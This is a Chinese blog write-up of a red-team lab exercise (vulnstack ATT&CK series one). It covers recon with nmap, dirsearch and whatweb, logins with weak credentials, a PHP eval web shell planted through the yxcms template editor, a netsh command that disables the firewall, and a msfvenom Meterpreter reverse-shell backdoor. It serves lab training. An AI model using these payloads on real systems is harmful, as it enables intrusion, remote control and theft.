<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>ATT&amp;cK实战系列—红队实战(一) | 佩里的实验室</title>
    <meta name="generator" content="VuePress 1.8.2">
    <link rel="icon" href="/favicon.ico">
    <meta name="description" content="--- 加载中 ---">
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
    
    <link rel="preload" href="/assets/css/0.styles.b3ab48fe.css" as="style"><link rel="preload" href="/assets/js/app.46813ee6.js" as="script"><link rel="preload" href="/assets/js/6.9798be95.js" as="script"><link rel="preload" href="/assets/js/1.dc08dc78.js" as="script"><link rel="preload" href="/assets/js/3.c1c2a038.js" as="script"><link rel="prefetch" href="/assets/js/10.79abadae.js"><link rel="prefetch" href="/assets/js/11.7e9dc367.js"><link rel="prefetch" href="/assets/js/12.a9018677.js"><link rel="prefetch" href="/assets/js/13.b24f515c.js"><link rel="prefetch" href="/assets/js/14.bb173663.js"><link rel="prefetch" href="/assets/js/15.244f9ba8.js"><link rel="prefetch" href="/assets/js/16.37d9f10a.js"><link rel="prefetch" href="/assets/js/17.dff17023.js"><link rel="prefetch" href="/assets/js/18.95bda0cb.js"><link rel="prefetch" href="/assets/js/19.bf18077d.js"><link rel="prefetch" href="/assets/js/20.04dc03a7.js"><link rel="prefetch" href="/assets/js/21.d769ec5a.js"><link rel="prefetch" href="/assets/js/22.d4971642.js"><link rel="prefetch" href="/assets/js/23.5eb61f98.js"><link rel="prefetch" href="/assets/js/24.b160d21c.js"><link rel="prefetch" href="/assets/js/25.e6f9756d.js"><link rel="prefetch" href="/assets/js/26.a8c3cf1d.js"><link rel="prefetch" href="/assets/js/27.67a03a74.js"><link rel="prefetch" href="/assets/js/28.272dead0.js"><link rel="prefetch" href="/assets/js/29.c351c36a.js"><link rel="prefetch" href="/assets/js/30.640af84b.js"><link rel="prefetch" href="/assets/js/31.316f1c2b.js"><link rel="prefetch" href="/assets/js/32.5acf9386.js"><link rel="prefetch" href="/assets/js/33.09ab2f96.js"><link rel="prefetch" href="/assets/js/34.fb9e3468.js"><link rel="prefetch" href="/assets/js/35.fe7e0b87.js"><link rel="prefetch" href="/assets/js/36.62533919.js"><link rel="prefetch" href="/assets/js/37.692e28c4.js"><link rel="prefetch" href="/assets/js/38.b5add9cc.js"><link rel="prefetch" href="/assets/js/39.b332fa26.js"><link rel="prefetch" href="/assets/js/4.005ad8a6.js"><link rel="prefetch" href="/assets/js/40.5f52940c.js"><link rel="prefetch" href="/assets/js/41.c40db85e.js"><link rel="prefetch" href="/assets/js/42.e27dbf92.js"><link rel="prefetch" href="/assets/js/43.4543d174.js"><link rel="prefetch" href="/assets/js/44.23cd10d0.js"><link rel="prefetch" href="/assets/js/45.905ef516.js"><link rel="prefetch" href="/assets/js/46.6c01744c.js"><link rel="prefetch" href="/assets/js/47.66e1715d.js"><link rel="prefetch" href="/assets/js/48.7dcbdf66.js"><link rel="prefetch" href="/assets/js/49.63cc5b9b.js"><link rel="prefetch" href="/assets/js/5.f3c6d307.js"><link rel="prefetch" href="/assets/js/50.4cfacb6a.js"><link rel="prefetch" href="/assets/js/51.9b5d117a.js"><link rel="prefetch" href="/assets/js/52.5eb39dd1.js"><link rel="prefetch" href="/assets/js/53.5f8ff0c6.js"><link rel="prefetch" href="/assets/js/54.bbe77239.js"><link rel="prefetch" href="/assets/js/55.e4d5292d.js"><link rel="prefetch" href="/assets/js/56.e229ff81.js"><link rel="prefetch" href="/assets/js/57.d28c54c6.js"><link rel="prefetch" href="/assets/js/58.349afec5.js"><link rel="prefetch" href="/assets/js/59.07c5f5ed.js"><link rel="prefetch" href="/assets/js/60.3b3a112a.js"><link rel="prefetch" href="/assets/js/61.967683c6.js"><link rel="prefetch" href="/assets/js/62.9d8565d5.js"><link rel="prefetch" href="/assets/js/63.33fae4a4.js"><link rel="prefetch" href="/assets/js/64.a15cfaaa.js"><link rel="prefetch" href="/assets/js/65.982eabb4.js"><link rel="prefetch" href="/assets/js/66.1c8b440a.js"><link rel="prefetch" href="/assets/js/67.ee89eb7b.js"><link rel="prefetch" href="/assets/js/68.f12bd9fa.js"><link rel="prefetch" href="/assets/js/69.09abcac1.js"><link rel="prefetch" href="/assets/js/7.0b814f7a.js"><link rel="prefetch" href="/assets/js/70.30fdeb6d.js"><link rel="prefetch" href="/assets/js/71.59b10064.js"><link rel="prefetch" href="/assets/js/72.e01efee0.js"><link rel="prefetch" href="/assets/js/73.3817e6d8.js"><link rel="prefetch" href="/assets/js/74.4ac6ec7e.js"><link rel="prefetch" href="/assets/js/75.31ae4d0b.js"><link rel="prefetch" href="/assets/js/76.4badd923.js"><link rel="prefetch" href="/assets/js/77.d9aff3b5.js"><link rel="prefetch" href="/assets/js/8.25d030e2.js"><link rel="prefetch" href="/assets/js/9.26646c44.js">
    <link rel="stylesheet" href="/assets/css/0.styles.b3ab48fe.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar" data-v-1aefc0b4><div data-v-1aefc0b4><div id="loader-wrapper" class="loading-wrapper" data-v-d48f4d20 data-v-1aefc0b4 data-v-1aefc0b4><div class="loader-main" data-v-d48f4d20><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div></div> <!----> <!----></div> <div class="password-shadow password-wrapper-out" style="display:none;" data-v-25ba6db2 data-v-1aefc0b4 data-v-1aefc0b4><h3 class="title" data-v-25ba6db2 data-v-25ba6db2>佩里的实验室</h3> <p class="description" data-v-25ba6db2 data-v-25ba6db2>--- 加载中 ---</p> <label id="box" class="inputBox" data-v-25ba6db2 data-v-25ba6db2><input type="password" value="" data-v-25ba6db2> <span data-v-25ba6db2>Konck! Knock!</span> <button data-v-25ba6db2>OK</button></label> <div class="footer" data-v-25ba6db2 data-v-25ba6db2><span data-v-25ba6db2><i class="iconfont reco-theme" data-v-25ba6db2></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-25ba6db2>vuePress-theme-reco</a></span> <span data-v-25ba6db2><i class="iconfont reco-copyright" data-v-25ba6db2></i> <a data-v-25ba6db2><!---->
            
          <span data-v-25ba6db2>2019 - </span>
          2023
        </a></span></div></div> <div class="hide" data-v-1aefc0b4><header class="navbar" data-v-1aefc0b4><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/logo.jpg" alt="佩里的实验室" class="logo"> <span class="site-name">佩里的实验室</span></a> <div class="links"><div class="color-picker"><a class="color-button"><i class="iconfont reco-color"></i></a> <div class="color-picker-menu" style="display:none;"><div class="mode-options"><h4 class="title">Choose mode</h4> <ul class="color-mode-options"><li class="dark">dark</li><li class="auto active">auto</li><li class="light">light</li></ul></div></div></div> <div class="search-box"><i class="iconfont reco-search"></i> <input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
      分类
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/技术杂谈/" class="nav-link"><i class="undefined"></i>
  技术杂谈
</a></li><li class="dropdown-item"><!----> <a href="/categories/未定义的/" class="nav-link"><i class="undefined"></i>
  未定义的
</a></li><li class="dropdown-item"><!----> <a href="/categories/生活小记/" class="nav-link"><i class="undefined"></i>
  生活小记
</a></li><li class="dropdown-item"><!----> <a href="/categories/学习笔记/" class="nav-link"><i class="undefined"></i>
  学习笔记
</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
  标签
</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
  时间线
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
      联系
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/PPPerryPan" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
  GitHub
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-1aefc0b4></div> <aside class="sidebar" data-v-1aefc0b4><div class="personal-info-wrapper" data-v-39576ba9 data-v-1aefc0b4><img src="/logo.jpg" alt="author-avatar" class="personal-img" data-v-39576ba9> <!----> <div class="num" data-v-39576ba9><div data-v-39576ba9><h3 data-v-39576ba9>67</h3> <h6 data-v-39576ba9>文章</h6></div> <div data-v-39576ba9><h3 data-v-39576ba9>10</h3> <h6 data-v-39576ba9>标签</h6></div></div> <ul class="social-links" data-v-39576ba9></ul> <hr data-v-39576ba9></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
      分类
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/技术杂谈/" class="nav-link"><i class="undefined"></i>
  技术杂谈
</a></li><li class="dropdown-item"><!----> <a href="/categories/未定义的/" class="nav-link"><i class="undefined"></i>
  未定义的
</a></li><li class="dropdown-item"><!----> <a href="/categories/生活小记/" class="nav-link"><i class="undefined"></i>
  生活小记
</a></li><li class="dropdown-item"><!----> <a href="/categories/学习笔记/" class="nav-link"><i class="undefined"></i>
  学习笔记
</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
  标签
</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
  时间线
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-message"></i>
      联系
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/PPPerryPan" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
  GitHub
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav> <!----> </aside> <div class="password-shadow password-wrapper-in" style="display:none;" data-v-25ba6db2 data-v-1aefc0b4><h3 class="title" data-v-25ba6db2 data-v-25ba6db2>ATT&amp;cK实战系列—红队实战(一)</h3> <!----> <label id="box" class="inputBox" data-v-25ba6db2 data-v-25ba6db2><input type="password" value="" data-v-25ba6db2> <span data-v-25ba6db2>Konck! Knock!</span> <button data-v-25ba6db2>OK</button></label> <div class="footer" data-v-25ba6db2 data-v-25ba6db2><span data-v-25ba6db2><i class="iconfont reco-theme" data-v-25ba6db2></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-25ba6db2>vuePress-theme-reco</a></span> <span data-v-25ba6db2><i class="iconfont reco-copyright" data-v-25ba6db2></i> <a data-v-25ba6db2><!---->
            
          <span data-v-25ba6db2>2019 - </span>
          2023
        </a></span></div></div> <div data-v-1aefc0b4><main class="page"><section><div class="page-title"><h1 class="title">ATT&amp;cK实战系列—红队实战(一)</h1> <div data-v-f875f3fc><!----> <i class="iconfont reco-date" data-v-f875f3fc><span data-v-f875f3fc>2022/8/15</span></i> <!----> <i class="tags iconfont reco-tag" data-v-f875f3fc><span class="tag-item" data-v-f875f3fc>网络安全</span></i></div></div> <div class="theme-reco-content content__default"><p>参考链接：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener noreferrer">漏洞详情 (qiyuanxuetang.net)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h2 id="环境搭建"><a href="#环境搭建" class="header-anchor">#</a> 环境搭建</h2> <p>环境介绍：三台机器，Win7是对外的web机，Win2003和Win2008是内网机器</p> <p>网络拓扑：</p> <p><img src="/assets/img/image-20220810172541831.aa503911.png" alt="image-20220810172541831"></p> <p>虚拟机网络配置：</p> <p><img src="/assets/img/image-20220810180624518.ddd4ae6d.png" alt="image-20220810180624518"></p> <p>Win7中确认防火墙状态</p> <p><img src="/assets/img/image-20220810210622951.5ee7a07f.png" alt="image-20220810210622951"></p> <p>将三台靶机关机创建快照，然后全部启动（Kali也要），并启动Win7的PHP和MySQL。</p> <p><img src="/assets/img/image-20220810213508539.1599b704.png" alt="image-20220810213508539"></p> <p>至此，环境搭建完毕</p> <h2 id="信息收集"><a href="#信息收集" class="header-anchor">#</a> 信息收集</h2> <p>在Kali中用nmap扫Win7，可以扫到80和3306端口处于启用状态</p> <p><img src="/assets/img/image-20220810213657373.6a9017ff.png" alt="image-20220810213657373"></p> <p>登陆网站，发现phpStudy探针，暴露大量隐私信息</p> <p><img src="/assets/img/image-20220810214003621.468eab39.png" alt="image-20220810214003621"></p> <p>3306端口的MySQL也可见，使用弱口令<code>root</code>, <code>root</code>也成功登陆</p> <p><img src="/assets/img/image-20220810214158744.4acc8b26.png" alt="image-20220810214158744"></p> <p>存在问题：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>HTTP明文传输
服务器指纹泄露（系统、Apache、PHP版本）
phpInfo信息泄露
MySQL数据库弱口令
MySQL数据库口令爆破
phpStudy后门（待检测）
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h3 id="目录扫描"><a href="#目录扫描" class="header-anchor">#</a> 目录扫描</h3> <h4 id="法一-御剑扫一下后台"><a href="#法一-御剑扫一下后台" class="header-anchor">#</a> 法一：御剑扫一下后台</h4> <p><img src="/assets/img/image-20220810235251383.2b08e2c0.png" alt="image-20220810235251383"></p> <h4 id="法二-dirsearch-py"><a href="#法二-dirsearch-py" class="header-anchor">#</a> 法二：Dirsearch.py</h4> <p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">maurosoria/dirsearch: Web path scanner (github.com)<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Documents/Git/dirsearch<span class="token punctuation">]</span>
└─<span class="token comment"># python3 dirsearch.py -u 192.168.220.138  </span>

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.2.8                                                   
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                              
                                                                                     
Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span>
Wordlist size: <span class="token number">11374</span>

Output File: /home/kali/Documents/Git/dirsearch/reports/_192.168.220.138/_22-08-13_07-04-34.txt

Target: http://192.168.220.138/

<span class="token punctuation">[</span>07:04:34<span class="token punctuation">]</span> Starting:                                                                 
<span class="token punctuation">[</span>07:04:37<span class="token punctuation">]</span> <span class="token number">403</span> -  211B  - /%3f/                                             
<span class="token punctuation">[</span>07:04:37<span class="token punctuation">]</span> <span class="token number">403</span> -  215B  - /%C0%AE%C0%AE%C0%AF                               
<span class="token punctuation">[</span>07:04:37<span class="token punctuation">]</span> <span class="token number">403</span> -  210B  - /%ff                                              
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  220B  - /.ht_wsr.txt                                      
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess.bak1                                   
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  225B  - /.htaccess.sample
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess_orig
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  221B  - /.htaccess_sc
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  222B  - /.htaccessOLD2
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  221B  - /.htaccessBAK
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  221B  - /.htaccessOLD
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  213B  - /.htm
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess.orig
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htaccess.save
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  223B  - /.htpasswd_test
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  219B  - /.htpasswds
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  220B  - /.httr-oauth
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  224B  - /.htaccess_extra
<span class="token punctuation">[</span>07:04:40<span class="token punctuation">]</span> <span class="token number">403</span> -  214B  - /.html                                            
<span class="token punctuation">[</span>07:05:19<span class="token punctuation">]</span> <span class="token number">403</span> -  225B  - /index.php::<span class="token variable">$DATA</span>                                 
<span class="token punctuation">[</span>07:05:32<span class="token punctuation">]</span> <span class="token number">200</span> -   71KB - /phpinfo.php                                                                                               
<span class="token punctuation">[</span>07:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  242B  - /phpmyadmin  -<span class="token operator">&gt;</span>  http://192.168.220.138/phpmyadmin/                                                        
<span class="token punctuation">[</span>07:05:32<span class="token punctuation">]</span> <span class="token number">301</span> -  242B  - /phpMyAdmin  -<span class="token operator">&gt;</span>  http://192.168.220.138/phpMyAdmin/                                                        
<span class="token punctuation">[</span>07:05:33<span class="token punctuation">]</span> <span class="token number">200</span> -   32KB - /phpmyadmin/ChangeLog                                                                                      
<span class="token punctuation">[</span>07:05:33<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /phpmyadmin/README                                                                                         
<span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyadmin/index.php                                                                                      
<span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyadmin/                                                                                               
<span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyAdmin/                                                                                               
<span class="token punctuation">[</span>07:05:35<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyAdmin/                                                                                               
<span class="token punctuation">[</span>07:05:35<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyadmin/
<span class="token punctuation">[</span>07:05:34<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyAdmin/index.php                             
<span class="token punctuation">[</span>07:05:49<span class="token punctuation">]</span> <span class="token number">403</span> -  225B  - /Trace.axd::<span class="token variable">$DATA</span>                                 
<span class="token punctuation">[</span>07:05:54<span class="token punctuation">]</span> <span class="token number">403</span> -  226B  - /web.config::<span class="token variable">$DATA</span>                                
                                                                             
Task Completed
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br></div></div><h2 id="指纹识别"><a href="#指纹识别" class="header-anchor">#</a> 指纹识别</h2> <h3 id="whatweb"><a href="#whatweb" class="header-anchor">#</a> <strong>Whatweb</strong></h3> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Documents/Git/dirsearch<span class="token punctuation">]</span>
└─<span class="token comment"># whatweb 192.168.220.138</span>
http://192.168.220.138 <span class="token punctuation">[</span><span class="token number">200</span> OK<span class="token punctuation">]</span> Apache<span class="token punctuation">[</span><span class="token number">2.4</span>.23<span class="token punctuation">]</span>, Country<span class="token punctuation">[</span>RESERVED<span class="token punctuation">]</span><span class="token punctuation">[</span>ZZ<span class="token punctuation">]</span>, Email<span class="token punctuation">[</span>admin@phpStudy.net<span class="token punctuation">]</span>, HTTPServer<span class="token punctuation">[</span>Windows <span class="token punctuation">(</span><span class="token number">32</span> bit<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span>Apache/2.4.23 <span class="token punctuation">(</span>Win32<span class="token punctuation">)</span> OpenSSL/1.0.2j PHP/5.4.45<span class="token punctuation">]</span>, IP<span class="token punctuation">[</span><span class="token number">192.168</span>.220.138<span class="token punctuation">]</span>, OpenSSL<span class="token punctuation">[</span><span class="token number">1.0</span>.2j<span class="token punctuation">]</span>, PHP<span class="token punctuation">[</span><span class="token number">5.4</span>.45<span class="token punctuation">]</span>, PasswordField<span class="token punctuation">[</span>password<span class="token punctuation">]</span>, Title<span class="token punctuation">[</span>phpStudy 探针 <span class="token number">2014</span><span class="token punctuation">]</span>, X-Powered-By<span class="token punctuation">[</span>PHP/5.4.45<span class="token punctuation">]</span>, X-UA-Compatible<span class="token punctuation">[</span>IE<span class="token operator">=</span>EmulateIE7<span class="token punctuation">]</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h3 id="御剑web指纹识别-大禹cms系统识别"><a href="#御剑web指纹识别-大禹cms系统识别" class="header-anchor">#</a> 御剑Web指纹识别/大禹CMS系统识别</h3> <p>略</p> <h2 id="漏洞分析"><a href="#漏洞分析" class="header-anchor">#</a> 漏洞分析</h2> <p>根据探测结果尝试访问phpMyAdmin，并使用弱密码<code>root</code>, <code>root</code> 成功登陆后台</p> <p>发现一张表 <code>newyxcms</code>，CMS为内容管理系统的意思</p> <p><img src="/assets/img/image-20220811142631141.fcf00b13.png" alt="image-20220811142631141"></p> <p>分辨出网站使用的是yxcms，尝试访问。</p> <p>然后在公告信息中发现后台用户名和密码</p> <p><img src="/assets/img/image-20220811142846156.cee73316.png" alt="image-20220811142846156"></p> <p>根据提示成功进入管理后台，并发现网站版本为1.2.1</p> <blockquote><p>如果没有发现密码，可以通过探测 <code>beifen.rar</code> 检查网站版本号，然后到网上找该版本号存在的漏洞进行攻击。</p></blockquote> <p><img src="/assets/img/image-20220811143010076.c4a3ecc2.png" alt="image-20220811143010076"></p> <p>在后台“前台模板”模块中发现可以编辑模板，模板通常可以自定义php文件，而如果可以自定义php文件直接就可以上一句话木马了。</p> <p><img src="/assets/img/image-20220811143241513.15bb06e9.png" alt="image-20220811143241513"></p> <p><img src="/assets/img/image-20220811143326582.7f90b2be.png" alt="image-20220811143326582"></p> <h2 id="渗透攻击"><a href="#渗透攻击" class="header-anchor">#</a> 渗透攻击</h2> <p>嵌入一句话木马<code>&lt;?php @eval($_REQUEST[666])?&gt;</code>，然后保存</p> <p><img src="/assets/img/image-20220811143422502.3c6479bd.png" alt="image-20220811143422502"></p> <p>上面御剑探测时没有探测到info.php在哪，所以到网上找一下yxcms的目录结构</p> <p><code>protected\apps\default\view\</code></p> <p><img src="/assets/img/image-20220811143650676.d0a9969f.png" alt="image-20220811143650676"></p> <p>到蚁剑中右键 添加数据：</p> <p><code>http://192.168.220.138/yxcms/protected/apps/default/view/default/info.php</code></p> <p><img src="/assets/img/image-20220811144748232.6580f710.png" alt="image-20220811144748232"></p> <p>到shell里看一下<code>ipconfig</code></p> <p><img src="/assets/img/image-20220811145021077.f8f9594b.png" alt="image-20220811145021077"></p> <p>查看防火墙状态 <code>netsh advfirewall show allprofiles</code></p> <p><img src="/assets/img/image-20220811145156669.3d7b901d.png" alt="image-20220811145156669"></p> <p>关闭防火墙 <code>netsh advfirewall set allprofiles state off</code></p> <h3 id="制作并上传木马"><a href="#制作并上传木马" class="header-anchor">#</a> 制作并上传木马</h3> <h4 id="制作后门"><a href="#制作后门" class="header-anchor">#</a> 制作后门</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.220.137 lport=9999 -f exe -o houmen.exe</span>

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class="token number">510</span> bytes
Final size of exe file: <span class="token number">7168</span> bytes
Saved as: houmen.exe
